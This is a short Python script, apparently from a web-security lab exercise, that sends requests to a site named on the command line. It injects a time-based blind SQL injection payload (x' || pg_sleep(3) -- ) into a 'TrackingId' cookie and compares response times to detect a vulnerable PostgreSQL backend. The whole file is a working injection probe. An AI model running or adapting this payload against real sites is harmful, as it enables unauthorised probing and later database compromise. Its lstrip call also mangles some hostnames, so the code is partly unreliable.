import requests, sys

site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')

url = f'https://{site}/'

def test_cookie(cookie_string):
  cookie_data = {
    'TrackingId' : cookie_string
  }
  resp = requests.get(url,cookies=cookie_data)
  return(resp.elapsed.total_seconds())

elapsed = test_cookie("x")
print(f"""Request "x" returned in {elapsed}""")

elapsed = test_cookie("x' || pg_sleep(3) -- ")
print(f"""Request "x' || pg_sleep(3) -- " returned in {elapsed}""")